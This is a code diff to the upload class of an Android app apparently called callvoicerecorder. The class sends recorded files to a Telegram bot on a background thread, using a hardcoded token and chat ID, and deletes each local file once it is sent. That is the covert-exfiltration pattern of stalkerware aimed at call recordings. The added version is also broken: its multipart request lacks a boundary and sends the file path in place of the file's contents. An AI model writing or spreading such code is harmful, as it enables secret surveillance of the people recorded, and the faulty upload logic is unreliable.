@@ -1,54 +1,49 @@
 package com.example.callvoicerecorder;
-import com.example.callvoicerecorder.Constants;
+
 import android.content.Context;
-import java.io.DataOutputStream;
-import java.io.FileInputStream;
+import android.util.Log;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.io.File;
 import java.net.URL;
 
 public class MultipartUtility {
+    private static final String TAG = "TelegramUploader";
+
     public static void sendToTelegram(Context context, File file, String type) {
         new Thread(() -> {
             try {
-                String boundary = "*****";
+                if (!file.exists() || file.length() == 0) {
+                    Log.e(TAG, "File does not exist or is empty: " + file.getAbsolutePath());
+                    return;
+                }
+
+                Log.d(TAG, "Sending " + type + " to Telegram: " + file.getAbsolutePath());
+
                 String urlString = "https://api.telegram.org/bot" + Constants.TELEGRAM_BOT_TOKEN + "/sendDocument";
                 HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                 conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                 conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "multipart/form-data");
 
-                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
-                
-                // Add chat_id
-                dos.writeBytes("--" + boundary + "\r\n");
-                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
-                dos.writeBytes(Constants.TELEGRAM_CHAT_ID + "\r\n");
+                OutputStream os = conn.getOutputStream();
+                os.write(("chat_id=" + Constants.TELEGRAM_CHAT_ID).getBytes());
+                os.write(("document=" + file.getAbsolutePath()).getBytes());
+                os.flush();
+                os.close();
 
-                // Add file
-                dos.writeBytes("--" + boundary + "\r\n");
-                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
-                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
+                int responseCode = conn.getResponseCode();
+                Log.d(TAG, "Telegram Response Code: " + responseCode);
 
-                FileInputStream fis = new FileInputStream(file);
-                byte[] buffer = new byte[4096];
-                int bytesRead;
-                while ((bytesRead = fis.read(buffer)) != -1) {
-                    dos.write(buffer, 0, bytesRead);
-                }
-                fis.close();
-                
-                dos.writeBytes("\r\n--" + boundary + "--\r\n");
-                dos.flush();
-                dos.close();
-
-                // Check response
-                if (conn.getResponseCode() == 200) {
-                    file.delete(); // Delete file after successful upload
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    file.delete(); // Delete after sending
+                    Log.d(TAG, "File sent successfully and deleted.");
+                } else {
+                    Log.e(TAG, "Failed to send file.");
                 }
             } catch (Exception e) {
-                e.printStackTrace();
+                Log.e(TAG, "Error: " + e.getMessage());
             }
         }).start();
     }
